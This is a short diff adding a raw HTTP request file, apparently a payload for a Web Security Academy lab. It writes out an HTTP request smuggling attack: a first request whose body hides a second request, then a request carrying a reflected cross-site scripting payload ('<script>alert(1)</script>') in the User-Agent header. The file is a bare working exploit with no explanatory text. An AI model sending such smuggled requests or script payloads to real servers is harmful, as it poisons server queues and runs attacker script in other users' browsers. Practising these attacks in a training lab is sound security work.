@@ -1,0 +1,13 @@
+GET / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 136
+X: YGET /404 HTTP/1.1
+Host: na_maikiti_putkata.web-security-academy.net
+User-Agent: foo
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+GET /post?postId=7 HTTP/1.1
+User-Agent: yu5md"><script>alert(1)</script>hgpov
+user-agent: yu5md"><script>alert(1)</script>hgpov
+X: Y
